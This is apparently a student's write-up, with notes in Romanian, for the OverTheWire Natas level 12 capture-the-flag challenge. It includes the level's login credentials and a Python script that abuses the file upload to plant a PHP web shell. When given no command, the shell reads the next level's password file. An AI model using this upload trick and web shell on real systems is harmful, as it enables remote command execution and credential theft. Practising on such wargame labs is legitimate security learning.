
# General info

Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
URL:      http://natas12.natas.labs.overthewire.org

# Special code section

```py
import requests

link = "http://natas12.natas.labs.overthewire.org"

data = {
    "filename": "test_filename.php"
}

file_content = '''
<?php
error_reporting(0);
$function=passthru; // system, exec, cmd
echo "<html>
<head>
<title>Ru24PostWebShell - ".$_POST['cmd']."</title>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";
echo "<form method=post>";
echo "<input type=text name=cmd size=85>";
echo "</form>";
echo "<pre>";
if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="find / -readable -type f -name '*natas13*'; cat /etc/natas_webpass/natas13;"; }
echo "".$function($_POST['cmd'])."</pre></body></html>";
?>
'''

files = {
    "uploadedfile" : ("test_filename.php", file_content)
}

response = requests.post(
    url=link,
    auth=("natas12", "yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB"),
    data=data,
    files=files
)


new_url = response.text.split(".php\">")[1].split("</a>")[0]
print(f"{link}/{new_url}")

```


pe scurt, trebuia sa incarc un fisier
am observat ca extensia e singura care nu se modifica DACA il incarci prin `requests` in loc de `HTML Form`
dupa, un write-up a mentionat ca putem incarca un fisier PHP (pentru ca serverul e scris in PHP)

asa ca m-am uitat pe internet la PHP Web Shells si am reusit sa le fac :D